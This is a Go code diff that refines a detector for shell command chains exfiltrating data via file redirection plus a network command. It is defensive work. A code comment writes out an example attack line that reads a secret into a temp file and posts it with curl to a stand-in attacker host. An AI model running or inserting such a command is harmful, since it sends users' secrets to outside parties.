@@ -986,19 +986,24 @@ func detectExfilRedirect(info *ExtractedInfo, commands []parsedCommand) {
 		return // already detected (e.g., from nested shell)
 	}
 
-	hasRedirect := false
+	// The redirect and exfil command must come from DIFFERENT commands.
+	// A single "curl url > file" is just saving output, not exfiltrating.
+	// The attack pattern is: "cat secret > tmp && curl -d @tmp evil.com"
+	// where one command writes sensitive data and another exfils it.
+	hasRedirectFromNonExfil := false
 	hasExfilCmd := false
 	for _, pc := range commands {
-		if len(pc.RedirPaths) > 0 {
-			hasRedirect = true
-		}
 		base := strings.ToLower(stripPathPrefix(pc.Name))
-		if exfilNetworkCommands[base] {
+		isExfil := exfilNetworkCommands[base]
+		if isExfil {
 			hasExfilCmd = true
+		}
+		if len(pc.RedirPaths) > 0 && !isExfil {
+			hasRedirectFromNonExfil = true
 		}
 	}
 
-	if hasRedirect && hasExfilCmd {
+	if hasRedirectFromNonExfil && hasExfilCmd {
 		info.ExfilRedirect = true
 	}
 }
